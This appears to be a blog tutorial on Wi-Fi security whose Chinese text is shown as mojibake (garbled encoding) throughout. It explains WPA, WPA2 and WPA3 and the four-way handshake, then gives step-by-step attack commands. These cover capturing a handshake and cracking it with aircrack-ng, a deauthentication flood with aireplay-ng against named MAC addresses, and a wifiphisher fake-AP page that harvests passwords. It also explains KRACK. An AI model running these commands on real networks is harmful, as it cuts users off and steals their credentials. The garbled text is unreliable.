<h4 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h4><p>å…¨ç§°æ˜¯ WiFi Protected Accessï¼ŒWiFiè®¿é—®ä¿æŠ¤ï¼Œå¸¸ç”¨çš„æ— çº¿ç½‘ç»œè®¤è¯æœºåˆ¶ä¹‹ä¸€ã€‚WPAæœ‰ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼š</p>
<ul>
<li>ä¼ä¸šæ¨¡å¼ WPA-EAP</li>
<li>ä¸ªäººæ¨¡å¼ WPA-PSK</li>
</ul>
<p>WPAä½¿ç”¨256ä½å¯†é’¥ï¼Œç›¸æ¯”äºWEPæ ‡å‡†ä¸­ä½¿ç”¨çš„64ä½å’Œ128ä½å¯†é’¥ï¼Œå¹¶ä¸”åœ¨WPAä¸­ä½¿ç”¨åŠ¨æ€å¯†é’¥åŠ å¯†ï¼Œç ´è§£èµ·æ¥è¦æ¯”WEPå›°éš¾ã€‚åœ¨WPAä¸­å¯†ç è¶Šå¤æ‚ï¼Œå®‰å…¨æ€§è¶Šé«˜ã€‚</p>
<p>TKIPç®—æ³• è™½ç„¶æ¯”èµ·WEPæœ‰å·¨å¤§è¿›æ­¥ï¼Œä½†æ˜¯å…¶ä»æ˜¯åŸºäºç›¸åŒçš„RC4åŠ å¯†ç®—æ³•è¿›è¡Œçš„ï¼Œä¹Ÿå¾ˆå®¹æ˜“å­˜åœ¨ç›¸åŒçš„é—®é¢˜ã€‚</p>
<h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><p>WPA2 ä½¿ç”¨AESåŠ å¯†ç®—æ³•å–ä»£äº†WPAä¸­çš„RC4ï¼Œä¹Ÿä½¿ç”¨æ›´å¼ºå®Œæ•´æ€§æ ¡éªŒç®—æ³•CCMPã€‚</p>
<p>æ˜¯WPAçš„é«˜çº§ç‰ˆæœ¬ï¼Œç”¨ä¸¤ç§æ›´å¼ºå¤§çš„åŠ å¯†å’Œèº«ä»½éªŒè¯æœºåˆ¶å–ä»£äº†RC4å’ŒTKIPï¼ˆä¸´æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼ŒTemporal Key Integrity Protocolï¼‰ï¼šAESï¼ˆadvanced encryption standardï¼Œé«˜çº§åŠ å¯†æ ‡å‡†ï¼‰ å’Œåˆ†åˆ«ä½¿ç”¨å¯†ç å—é“¾æ¥æ¶ˆæ¯èº«ä»½éªŒè¯ä»£ç åè®® ( CCMP ) çš„è®¡æ•°å™¨æ¨¡å¼ã€‚</p>
<p>WAP2 å¯¹äºå®¶åº­ç½‘ç»œè¾ƒä¸ºä½¿ç”¨ï¼Œä½†å¯¹äºä¼ä¸šç½‘ç»œå¾ˆè„†å¼±ã€‚æ”»å‡»è€…å¯ä»¥è®¿é—®ä½¿ç”¨WPA2ä¿æŠ¤çš„ç½‘ç»œï¼Œè®¿é—®ç½‘ç»œåä»–ä»¬å¯ä»¥è®¿é—®å¯†ç ã€‚å­—å…¸æ”»å‡»æ˜¯WPA2å¯†ç æœ€å®¹æ˜“å—åˆ°æ”»å‡»çš„éƒ¨åˆ†ï¼Œå¯ä»¥åˆ©ç”¨</p>
<p>airomon-ngå¯¹å¯†ç è¿›è¡Œç ´è§£æ”»å‡»ã€‚</p>
<h4 id="WPA3"><a href="#WPA3" class="headerlink" title="WPA3"></a>WPA3</h4><p>Wi-Fi Protected Access Version 3 Wi-Fiè®¿é—®ä¿æŠ¤3ä»£ 2018å¹´æå‡ºçš„æ–°å®‰å…¨æ ‡å‡†ï¼Œé‡‡ç”¨AES-GCMPåŠ å¯†æ–¹å¼ï¼Œç¼“è§£äº†WPA2ä¸­å­˜åœ¨çš„æŠ€æœ¯ç¼ºé™·ï¼Œç¯å¢ƒç±»KRACKæ”»å‡»å’Œdeauthç­‰æ— çº¿æ”»å‡»å¸¦æ¥çš„å½±å“ï¼Œå¤§å¤§æé«˜äº†é…ç½®ã€èº«ä»½éªŒè¯ã€åŠ å¯†ä¸Šçš„å®‰å…¨æ€§ã€‚</p>
<p>WAP3æœ‰ä¸¤ç§å®‰å…¨æ¨¡å¼ï¼š</p>
<ul>
<li>WAP3ä¸ªäººæ¨¡å¼ï¼šæä¾› 128 ä½åŠ å¯†ï¼Œä½¿ç”¨ WPA-PSK/é¢„å…±äº«å¯†é’¥ã€‚</li>
<li>WAP3ä¼ä¸šæ¨¡å¼ï¼šæä¾› 192 ä½åŠ å¯†ï¼Œä½¿ç”¨ AAA/RADIUS è®¤è¯æœåŠ¡å™¨ã€‚</li>
</ul>
<h3 id="802-11-è¿æ¥è¿‡ç¨‹"><a href="#802-11-è¿æ¥è¿‡ç¨‹" class="headerlink" title="802.11 è¿æ¥è¿‡ç¨‹"></a>802.11 è¿æ¥è¿‡ç¨‹</h3><p>æ¥å…¥ç‚¹ï¼ˆAPï¼‰å’Œæ— çº¿å®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥åŒ…å«3ä¸ªè¿‡ç¨‹ï¼šæ‰«æã€è®¤è¯ã€å…³è”ã€‚å®Œæˆå®‰å…¨æ€§æ ¡éªŒå APå‘Station å‘èµ·å››æ¬¡æ¡æ‰‹ã€‚</p>
<ul>
<li><p>æ‰«æï¼ˆæ¢æµ‹ï¼‰ï¼šStationæ‰«ææ‰€åœ¨åŒºåŸŸå­˜åœ¨çš„802.11ç½‘ç»œ</p>
<p>Stationä¸»åŠ¨å‘é€ReqåŒ…ï¼ŒAPæ”¶åˆ°Reqå¸§åå›å¤Rspå¸§</p>
</li>
<li><p>è®¤è¯ï¼šStationä¸APè¿›è¡Œè®¤è¯</p>
<p>APç¡®è®¤ Stationæ˜¯ä¸æ˜¯802.11è®¾å¤‡ ç¡®è®¤å½¼æ­¤å¯ä»¥æ­£å¸¸é€šè®¯</p>
</li>
<li><p>å…³è”ï¼š Stationä¸APè¿›è¡Œå…³è”</p>
<p>Stationä¸APå…³è”ä»¥ä¾¿è·å¾—ç½‘ç»œçš„è®¿é—®æƒï¼Œå…³è”æˆåŠŸåStationä¼šæ”¶åˆ°APçš„å“åº”ï¼ŒåŒ…å«æˆåŠŸçš„çŠ¶æ€ç å’Œå…³è”æ ‡è¯†ç¬¦</p>
</li>
</ul>
<h3 id="WPA-WPA2-å››æ¬¡æ¡æ‰‹"><a href="#WPA-WPA2-å››æ¬¡æ¡æ‰‹" class="headerlink" title="WPA/WPA2 å››æ¬¡æ¡æ‰‹"></a>WPA/WPA2 å››æ¬¡æ¡æ‰‹</h3><p>æ— çº¿Wifiçš„å››æ¬¡æ¡æ‰‹å°±æ˜¯ key exchangeçš„è¿‡ç¨‹ã€‚æ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºèº«ä»½è®¤è¯ï¼ˆauthenticationï¼‰ã€å…³è”ï¼ˆassociationï¼‰å’Œå®‰å…¨éªŒè¯ï¼ˆsecurity validationï¼‰ã€‚å››æ¬¡æ¡æ‰‹ä¸æ˜¯ç›´æ¥å°†å¯†ç å‘é€åˆ° APï¼Œè€Œæ˜¯é€šè¿‡ EAPOLï¼ˆExtensible authentication protocol over LANï¼‰è¿›è¡Œæ¶ˆæ¯äº¤æ¢ã€‚ä¸‹é¢å°†ç®€å•ä»‹ç»ä¸‹å››æ¬¡æ¡æ‰‹çš„æµç¨‹ã€‚</p>
<p><img src="/posts/ae3c8023/3.png"></p>
<h4 id="Msg1"><a href="#Msg1" class="headerlink" title="Msg1"></a>Msg1</h4><ul>
<li>AP</li>
</ul>
<p>APç”Ÿæˆä¸€ä¸ªéšæœºæ•°ANonce å¹¿æ’­å‘é€ç»™Station</p>
<ul>
<li>Sta</li>
</ul>
<p>Staæ¥æ”¶APå‘é€çš„éšæœºæ•°ANonceï¼Œè®¡ç®—ç”Ÿäº§PTK(Sta)</p>
<p>æå–PTKçš„å‰16å­—èŠ‚KCK  è®¡ç®—å‡ºMIC(Sta)</p>
<h4 id="Msg2"><a href="#Msg2" class="headerlink" title="Msg2"></a>Msg2</h4><ul>
<li>Sta</li>
</ul>
<p>Staå‘é€SNonceå’ŒMIC(sta)ç»™AP</p>
<ul>
<li>AP</li>
</ul>
<p>APæ”¶åˆ°Snoceåè®¡ç®—ç”ŸæˆPTK(AP)</p>
<p>æ ¹æ®PTKçš„å‰16å­—èŠ‚KCK ç”ŸæˆMIC(AP)</p>
<p>é€šè¿‡æ¯”å¯¹MIC(AP)å’ŒMIC(Sta)æ ¡éªŒæ¥PTK(AP)å’ŒPTK(Sta)ï¼Œå¦‚æœä¸€è‡´åˆ™è¿›è¡Œä¸‹ä¸€æ­¥æ¡æ‰‹</p>
<h4 id="Msg3"><a href="#Msg3" class="headerlink" title="Msg3"></a>Msg3</h4><ul>
<li>AP</li>
</ul>
<p>APæ ¹æ®GMKã€ANonceã€AP Mac ç”Ÿæˆ GTKï¼Œä½¿ç”¨PTKä¸­é—´16å­—èŠ‚KCKåŠ å¯†GTK</p>
<p>GTK = PRF(GMK + ANonce + Mac(AA))</p>
<p>æ ¹æ®PTK(AP)å‰16å­—èŠ‚ KCK ç”Ÿæˆ MIC(AP)</p>
<p>å°†åŠ å¯†åçš„GTKå’ŒMIC(AP)å‘é€ç»™Sta</p>
<ul>
<li>Sta</li>
</ul>
<p>éªŒè¯MIC(AP)ä¸MIC(Sta)</p>
<p>å°†APå‘é€çš„åŠ å¯†åçš„GTKä½¿ç”¨PTKä¸­é—´16å­—èŠ‚KEKè¿›è¡Œè§£å¯†</p>
<h4 id="Msg4"><a href="#Msg4" class="headerlink" title="Msg4"></a>Msg4</h4><ul>
<li>Sta</li>
</ul>
<p>å‘é€æœ€åä¸€æ¬¡EAPOL-KEYç»™AP è¿›è¡Œæœ€ç»ˆè®¤è¯</p>
<ul>
<li>AP</li>
</ul>
<p>æ¥æ”¶Staå‘é€çš„EAPOL-KEYè¿›è¡Œè®¤è¯ï¼Œè®¤è¯é€šè¿‡åˆ™ä»£è¡¨æ¡æ‰‹æˆåŠŸã€‚</p>
<p>å¦‚æœè®¤è¯æˆåŠŸ åŒæ–¹å°†å®‰è£…å„ç§è®¡ç®—å‡ºæ¥çš„GTKå’ŒPTK å®Œæˆå››æ¬¡æ¡æ‰‹ã€‚</p>
<h3 id="å¸¸è§æ”»å‡»æ–¹å¼"><a href="#å¸¸è§æ”»å‡»æ–¹å¼" class="headerlink" title="å¸¸è§æ”»å‡»æ–¹å¼"></a>å¸¸è§æ”»å‡»æ–¹å¼</h3><h4 id="ç¦»çº¿å­—å…¸æ”»å‡»"><a href="#ç¦»çº¿å­—å…¸æ”»å‡»" class="headerlink" title="ç¦»çº¿å­—å…¸æ”»å‡»"></a>ç¦»çº¿å­—å…¸æ”»å‡»</h4><p>å¯é€šè¿‡aircrack-ng å¯¹WPA-PSK è¿›è¡Œå¯†ç ç ´è§£</p>
<p>æŸ¥çœ‹å¯ç”¨çš„æ— çº¿ç½‘å¡ <code>sudo airmon-ng</code></p>
<p><img src="/posts/ae3c8023/4.png"></p>
<p>æŒ‡å®šæ— çº¿ç½‘å¡å¼€å¯ç›‘å¬æ¨¡å¼ <code>airmon-ng start wlan0</code></p>
<p><img src="/posts/ae3c8023/5.png"></p>
<p>æŸ¥çœ‹ç½‘å¡æ˜¯å¦å¼€å¯ç›‘æ§ <code>ifconfig </code></p>
<p><img src="/posts/ae3c8023/6.png"></p>
<p>æ‰«æé™„è¿‘çš„æ— çº¿ç½‘ç»œ <code>sudo airodump-ng wlan0mon</code> </p>
<p><img src="/posts/ae3c8023/7.png"></p>
<blockquote>
<p>BSSID ï¼šæ— çº¿APçš„ç¡¬ä»¶åœ°å€</p>
<p>PWRï¼šä¿¡å·å¼ºåº¦ï¼Œç»å¯¹å€¼è¶Šå°ä¿¡å·è¶Šå¼ºã€‚å€¼ä¸ºè´Ÿæ•°</p>
<p>CHï¼šæ— çº¿ç½‘ç»œä¿¡é“</p>
<p>ENCï¼šåŠ å¯†æ–¹å¼</p>
<p>ESSIDï¼šæ— çº¿ç½‘ç»œå</p>
</blockquote>
<p>ä½¿ç”¨å‚æ•°è¿‡æ»¤æ‰«æåˆ—è¡¨ï¼Œç¡®å®šæ‰«æç›®æ ‡</p>
<blockquote>
<p>ä½¿ç”¨å‘½ä»¤ï¼šairodump-ng -w &lt;æ‰«æç»“æœä¿å­˜çš„æ–‡ä»¶å&gt; -c &lt;æ— çº¿ç½‘ç»œä¿¡é“&gt; â€“bssid &lt;ç›®æ ‡æ— çº¿ AP çš„ç¡¬ä»¶åœ°å€&gt; &lt;å¤„äºç›‘å¬æ¨¡å¼çš„ç½‘å¡åç§°&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo airodump-ng -w output -c 11 --bssid E2:D7:74:C2:F9:44  wlan0mon </span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/8.png"></p>
<p>ä½¿ç”¨aireplay-ng å¯¹ç›®æ ‡wifiå‘èµ·æ”»å‡»</p>
<blockquote>
<p>ä½¿ç”¨å‘½ä»¤ï¼šaireplay-ng -&lt;æ”»å‡»æ¨¡å¼&gt; &lt;æ”»å‡»æ¬¡æ•°&gt; -a &lt;æ— çº¿APç¡¬ä»¶åœ°å€&gt; -c &lt;ç”¨æˆ·è®¾å¤‡ç¡¬ä»¶åœ°å€&gt; &lt;å¤„äºç›‘å¬æ¨¡å¼çš„ç½‘å¡åç§°&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a E2:D7:74:C2:F9:44 -c 56:D1:E9:EB:EA:2F  wlan0mon</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/9.png"></p>
<p>å‘èµ·æ”»å‡»åï¼Œå½“airodump-ng æˆåŠŸç›‘å¬åˆ°äº†æ¡æ‰‹åŒ…ï¼Œé€€å‡ºæŠ“åŒ…åå¯ä»¥è¿›è¡Œçˆ†ç ´ã€‚åœ¨æ¡Œé¢ä¸‹ç”Ÿæˆäº†output-01.cap</p>
<p><img src="/posts/ae3c8023/10.png"></p>
<p>ä½¿ç”¨aircrack-ng æš´åŠ›ç ´è§£wifiå¯†ç </p>
<blockquote>
<p>aircrack-ng -w å¯†ç å­—å…¸ &lt;åŒ…å«æ¡æ‰‹åŒ…çš„ cap æ–‡ä»¶&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aircrack-ng -w pass.txt output-01.cap</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/11.png"></p>
<p>è¿™é‡Œçš„å¯†ç è¿˜éœ€è¦è·Ÿç€å®é™…æƒ…å†µå»æ„é€ ï¼Œæˆä¸æˆåŠŸä¸»è¦å–å†³äºå¯†ç å­—å…¸çš„å¼ºåº¦ã€‚</p>
<h4 id="DeAuth-Attack"><a href="#DeAuth-Attack" class="headerlink" title="DeAuth Attack"></a>DeAuth Attack</h4><p>Wifiä¸­æ–­æ”»å‡»ï¼Œæ”»å‡»åŸç†ï¼š Wi-Fiå…³è”æ•°æ®å¸§æ²¡æœ‰è¢«åŠ å¯†ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ªé€ ç®¡ç†å¸§ï¼Œä»è€Œè®©æ”»å‡»è€…å¯ä»¥å‘é€äººå‘˜ å–æ¶ˆè®¤è¯çš„æ•°æ®åŒ…å¼ºè¡Œåˆ‡æ–­APä¸å®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥ã€‚</p>
<p>1.æŸ¥çœ‹å¯ç”¨çš„æ— çº¿ç½‘å¡ <code>sudo airmon-ng</code></p>
<p><img src="/posts/ae3c8023/12.png"></p>
<p>2.æŒ‡å®šæ— çº¿ç½‘å¡å¼€å¯ç›‘å¬æ¨¡å¼ <code>airmon-ng start wlan0</code></p>
<p><img src="/posts/ae3c8023/13.png"></p>
<p>3.airodump-ng wlan0 å¯¹å½“å‰ç¯å¢ƒæ— çº¿ç½‘ç»œè¿›è¡Œå—…æ¢ æ ¹æ®ESSISè·å–æ”»å‡»ç›®æ ‡MAC</p>
<p>æ‰«æé™„è¿‘çš„æ— çº¿ç½‘ç»œ <code>sudo airodump-ng wlan0mon</code> </p>
<p><img src="/posts/ae3c8023/14.png"></p>
<p>æ‰¾åˆ°æµ‹è¯•ç›®æ ‡wifi SeåŠè¿æ¥æ‰‹æœºçš„MACåœ°å€</p>
<p>WIFI MAC 26:04:1C:39:46:7F</p>
<p>Station MAC  A2:B4:63:18:D6:C2</p>
<p>4.åˆ©ç”¨ airreplay-ng è¿›è¡Œ DeAuth æ”»å‡»</p>
<p>sudo aireplay-ng -0 100 -a 26:04:1C:39:46:7F -c A2:B4:63:18:D6:C2 -D wlan0mon</p>
<p>-0 é€‰æ‹©DeAuthæ”»å‡»æ¨¡å¼</p>
<p>-a APçš„MACåœ°å€</p>
<p>-c æŒ‡å®šç›®æ ‡æœºå™¨çš„macåœ°å€</p>
<p>-D å¦‚æœä¸åŠ çš„è¯ä¼šæŠ¥é”™No such BSSID available.</p>
<p><img src="/posts/ae3c8023/15.png"></p>
<p>æ”»å‡»æˆåŠŸå è¿æ¥ç›®æ ‡ç½‘ç»œçš„æœºå™¨éƒ½ä¼šè¢«æ–­å¼€è¿æ¥ã€‚</p>
<p><img src="/posts/ae3c8023/16.png"></p>
<h4 id="Wi-Fi-é’“é±¼"><a href="#Wi-Fi-é’“é±¼" class="headerlink" title="Wi-Fi é’“é±¼"></a>Wi-Fi é’“é±¼</h4><p>Wifiphisher</p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a></p>
<p>å·¥ä½œåŸç†ï¼š</p>
<ul>
<li>å—…æ¢é™„ä»¶æ— çº¿åŒºåŸŸå†…çš„APï¼Œå¹¶åˆ›å»ºä¸€ä¸ªä¼ªé€ çš„AP</li>
<li>Wifiphisherå¯¹ç›®æ ‡APè¿æ¥çš„æ‰€æœ‰å®¢æˆ·ç«¯æŒç»­å‘é€å¤§é‡çš„è§£é™¤è®¤è¯çš„æ•°æ®åŒ…</li>
<li>å‘è¢«æ”»å‡»è€…æ¨é€ä¸€ä¸ªé’“é±¼é¡µé¢ï¼Œè¦æ±‚è¢«æ”»å‡»è€…è¾“å…¥å¯†ç </li>
</ul>
<p>å®ä¾‹å¦‚ä¸‹ï¼š</p>
<p>sudo wifiphisher</p>
<p>ç„¶åä¼šæ¢æµ‹åˆ°å‘¨è¾¹çš„ç½‘ç»œä¿¡å·æºï¼Œç„¶åé€‰æ‹©éœ€è¦æ”»å‡»çš„wifiï¼ˆè¿™é‡Œä»¥æ‰‹æœºçƒ­ç‚¹MI11ä¸ºä¾‹ï¼‰</p>
<p><img src="/posts/ae3c8023/17.png"></p>
<p><img src="/posts/ae3c8023/18.png"></p>
<p>æ¥ç€é€‰æ‹©æ”»å‡»æ¨¡å¼ï¼Œç¬¬ä¸€é¡¹â€œç½‘ç»œç®¡ç†å™¨è¿æ¥â€œï¼šæ¨¡æ‹Ÿwifiå¤±è´¥ç„¶åéœ€è¦é‡æ–°è¾“å…¥å¯†ç ã€‚</p>
<p><img src="/posts/ae3c8023/19.png"></p>
<p>å›è½¦ä¹‹åä¼šè‡ªåŠ¨è·³è½¬åˆ°ä»¥ä¸‹</p>
<p><img src="/posts/ae3c8023/20.png"></p>
<p>wifiphisherä¼šå‘å°„ä¸€ä¸ªä¸åŸwifiç›¸åŒåç§°çš„wifiï¼Œå¦‚æœç”¨æˆ·æƒ³è¦é‡æ–°è¿æ¥è¯¥wifiï¼Œä¼šå¼¹å‡ºä¸€ä¸ªé‡æ–°è¾“å…¥å¯†ç çš„é¡µé¢ã€‚</p>
<p><img src="/posts/ae3c8023/21.png"></p>
<p>å¦‚æœç‚¹å‡»å–æ¶ˆä¼šå¦‚ä¸‹å¦‚æ‰€ç¤ºï¼Œè¿˜æ˜¯ä¼ªè£…çš„æ¯”è¾ƒçœŸå®çš„ã€‚</p>
<p><img src="/posts/ae3c8023/22.png"></p>
<p>å½“ç”¨æˆ·è¾“å…¥å¯†ç æ—¶ æˆ‘ä»¬ä¾¿é€šè¿‡è¿™ç§wifiè°ƒç”¨çš„æ–¹å¼å¾—åˆ°äº†wifiå¯†ç </p>
<p><img src="/posts/ae3c8023/23.png"></p>
<h4 id="å¯†é’¥é‡è£…æ”»å‡»"><a href="#å¯†é’¥é‡è£…æ”»å‡»" class="headerlink" title="å¯†é’¥é‡è£…æ”»å‡»"></a>å¯†é’¥é‡è£…æ”»å‡»</h4><p>å¯†é’¥é‡è£…æ”»å‡»ï¼Œå…¶æœ¬è´¨å±äºé‡æ”¾æ”»å‡»ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ WPA/WPA2 åè®®åœ¨å®ç°ä¸Šçš„æ¼æ´ï¼Œå‡ºç°åœ¨å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­ã€‚å½“å®¢æˆ·ç«¯è¯•å›¾è¿æ¥ä¸€ä¸ªå—ä¿æŠ¤çš„Wi-Fiç½‘ç»œæ—¶ï¼ŒAPå°†ä¼šå‘èµ·å››æ¬¡æ¡æ‰‹å®Œæˆç›¸äº’è®¤è¯ã€‚å…¶ä¸­åŒ…å«ä¸€ä¸ª AP å‘å®¢æˆ·ç«¯ä¼ è¾“ Msg3 çš„è¿‡ç¨‹ï¼Œæ”»å‡»è€…å¯ä»¥åå¤é‡æ”¾è¿™ä¸€è¿‡ç¨‹ï¼Œå¯¼è‡´ Nonce è¢«é‡ç½®ï¼Œç»§è€Œå¯¼è‡´ä¼ è¾“çš„æ•°æ®å¯ä»¥è¢«æ”»å‡»è€…è§£å¯†ï¼Œè¿™ä¾¿æ˜¯ Krackæ”»å‡»çš„å¤§è‡´æµç¨‹ã€‚</p>
<p><strong>å…·ä½“åŸç†åˆ†æå¦‚ä¸‹ï¼š</strong></p>
<p>åœ¨å››æ¬¡æ¡æ‰‹å®¢æˆ·ç«¯ä¸APé€šä¿¡è¿‡ç¨‹ä¸­ï¼ŒAPä¸€èˆ¬ç§°ä¸ºâ€Authenticatorâ€ï¼Œè¡¨ç¤ºè®¤è¯æ–¹ï¼›å®¢æˆ·ç«¯ç§°ä¸ºâ€Supplicantâ€ï¼Œè¡¨ç¤ºè¯·æ±‚æ–¹ã€‚åœ¨å››æ¬¡æ¡æ‰‹åè®®ä¸­éƒ½ä¼šç”Ÿæˆä¸€ä¸ªä¼šè¯å¯†é’¥ PTK(Pairwise Transit Key)ï¼Œæˆå¯¹ä¼ è¾“å¯†é’¥ï¼Œç”¨æ¥åŠ å¯† AP å’Œ Station é€šè®¯çš„å•æ’­æ•°æ®åŒ…ï¼ŒAP ä¸æ¯ä¸ª Station é€šä¿¡ç”¨çš„PTKéƒ½æ˜¯å”¯ä¸€çš„ã€‚PTKçš„åŒ…å«äº”éƒ¨åˆ†ï¼šPMKã€ANonceã€SNonceã€Mac(AA)ã€MAC(SA)ï¼Œå…¶ä¸­ANonceã€SNonceä¸ºç”Ÿæˆçš„éšæœºæ•°ï¼›MAC(AA)ã€MAC(SA)åˆ™ä¸ºå¯¹åº”ä¸¤ç«¯çš„MACåœ°å€ï¼›PMKä¸ºä¸»å¯†é’¥ï¼Œä¸å‰é¢å››è€…å…±åŒç»„æˆPTKï¼ŒPTKæ‰æ˜¯æ•´ä¸ªçš„ç”¨æ¥åŠ å¯†æ•°æ®çš„å¯†é’¥ã€‚</p>
<p>å®¢æˆ·ç«¯åœ¨å¦‚æœè¦å‘é€æ˜æ–‡æ•°æ®ï¼Œåˆ™éœ€è¦åˆ©ç”¨ PTK å’Œ Nonce ç”Ÿäº§ä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥ä¸­çš„ Nonce å¹¶ä¸æ˜¯å‰é¢æåˆ°çš„ ANonce æˆ– SNonceï¼Œå®ƒä¼šéšç€å®¢æˆ·ç«¯æ¯å‘é€ä¸€ä¸ªæŠ¥æ–‡ï¼ŒNonce å°±ä¼šè‡ªåŠ¨åŠ 1ï¼Œ Nonce å’Œ PTK æ··åˆæˆä¸ºå¯†é’¥æµåï¼Œä¸æ˜æ–‡æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—ä¾¿ç”Ÿæˆäº†å¯†æ–‡æ•°æ®ã€‚</p>
<p>æ‰€ä»¥åœ¨ Krack æ”»å‡»è¿‡ç¨‹ä¸­ Nonce é‡ç”¨ï¼Œä¹Ÿå°±æ„å‘³ç€å¯†é’¥æµé‡ç”¨ã€‚åœ¨å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯æ”¶åˆ° AP å‘æ¥çš„ Msg3 åï¼Œä¼šæŒ‰ç…§åŠ å¯†å¯†é’¥ï¼Œä»¥ç”¨äºåŠ å¯†æ•°æ®å¸§ã€‚å¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰æ”¶åˆ° APå‘é€çš„ Msg3ï¼ŒAP ä¼šé‡ä¼  Msg3ï¼Œä½†æ˜¯ Station å¹¶ä¸ä¼šæ ¹æ®æ˜¯å¦æ”¶åˆ° Msg3 è¿›è¡Œåˆ¤æ–­ã€‚ åœ¨APé‡ä¼  Msg3 ä¹‹å‰ï¼Œå®¢æˆ·ç«¯å·²ç»åœ¨ä¹‹å‰çš„ Msg4 å‘é€åå®‰è£…äº† PTKï¼Œæ­¤æ—¶å®¢æˆ·ç«¯è‚¯å®šä¼šå‘ AP å‘é€äº†åŠ å¯†æ•°æ®ã€‚ä½†ç”±äºå‰é¢é‡ä¼  Msg3 å¯¼è‡´ Nonce è¢«é‡ç”¨äº†ï¼Œåœ¨æ•°æ®åŠ å¯†æ—¶è¿˜æ˜¯é‡‡ç”¨ä¹‹å‰çš„ Nonce å€¼ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¼ è¾“çš„ä¸¤æ¬¡æ•°æ®ä¸­ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ª Nonceã€‚</p>
<p>åœ¨å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­å‘è¿‡æ¥çš„æ˜æ–‡çš„msg4 å’Œé‡ä¼  msg3 åçš„msg4 å¤„ç†Authenticator ä¹‹å¤–æ²¡æœ‰ä¸åŒï¼ˆmsg1å’Œmsg2ä¸­çš„Authenticatorä¸ºåŒä¸€ä¸ªï¼Œåœ¨msg3ä¸­åˆ™ä¸ºAuthenticator+1ï¼‰ï¼Œè€Œ Authenticator å¯¹ Msg4 åˆæ— å½±å“ã€‚æ­¤æ—¶æ”»å‡»è€…æœ‰äº†æ˜æ–‡çš„ Msg4 å’Œå¯¹åº” Msg4 çš„å¯†æ–‡ï¼Œæ˜æ–‡å¼‚æˆ–å¯†æ–‡ä¾¿å¯å¾—åˆ°åŠ å¯†æ—¶çš„å¯†é’¥æµã€‚</p>
<p>ç”±äº Nonce é‡ç½®å¯¼è‡´æˆ‘ä»¬åœ¨åŠ å¯†æ•°æ®æ—¶ä½¿ç”¨çš„å¯†é’¥å’Œå‰é¢çš„å¯†é’¥æµæ˜¯åŒä¸€ä¸ªå¯†é’¥ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å‰é¢æ¨åˆ°çš„å¯†é’¥æµå»è§£å¯†åé¢ä¼ è¾“çš„æ•°æ®ï¼Œæœ€ç»ˆå®ç°æ•°æ®çš„è§£å¯†ã€‚</p>
<p>æ”»å‡»è€…ä½œä¸ºä¸­é—´äººï¼Œæ”¾ä»»å››æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­çš„å‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œåœ¨æœ€åä¸€æ¬¡æ¡æ‰‹æ˜¯é˜»æ–­msg4çš„ä¼ è¾“ï¼Œå¯¼è‡´ AP é‡ä¼ Msg3ã€å¯†é’¥é‡è£…ã€Nonce è¢«é‡ç½®ï¼Œå†æ ¹æ®å‰é¢çš„æ˜æ–‡å’Œå¯†æ–‡å¯¹åº”å…³ç³»æ¨åˆ°å‡ºå¯†é’¥æµï¼Œç„¶åé€šè¿‡å¯†é’¥æµè§£å¯†è¢«é‡è£…ååŠ å¯†çš„æ•°æ®ï¼Œæœ€ç»ˆå®ç°æ•°æ®è§£å¯†ã€‚</p>
<p><img src="/posts/ae3c8023/24.png"></p>
<p>åœ¨Linuxå’ŒAndroidç³»ç»Ÿé‡è®¾å®šäº†æ¥å—åŠ å¯†Msg3é‡ä¼ ï¼Œè€Œåœ¨Windows ç³»ç»Ÿå’Œ IOS ç³»ç»Ÿè¿èƒŒäº† IEEE è§„å®šçš„802.11æ ‡å‡†ï¼Œä¸ä¼šæ¥å— Msg3 é‡ä¼ è€Œé€ƒè¿‡ä¸€åŠ«ã€‚</p>
<p>å¯¹äºKrackçš„é˜²å¾¡ï¼Œå¯¹äºä¸ªäººç”¨æˆ·é’ˆå¯¹Krackæœ€æ–¹ä¾¿çš„æ–¹æ³•å°±æ˜¯åŠæ—¶æ›´æ–°æˆ–å®‰è£…å¯¹åº”è¡¥ä¸ï¼›å¯¹äºä¼ä¸šç”¨æˆ·ï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨ WIPS çš„é˜²å¾¡ç³»ç»Ÿï¼Œå®ƒé‡‡ç”¨çš„æ˜¯ä¸æ”»å‡»è€…ç±»ä¼¼çš„æ€è·¯ï¼Œä¹Ÿæ˜¯é‡‡ç”¨é“¾è·¯æ”»å‡»çš„æ–¹å¼æ‰“æ‰æ”»å‡»è€…çš„è®¾å¤‡è€Œå®ç°ä¿æŠ¤ã€‚</p>
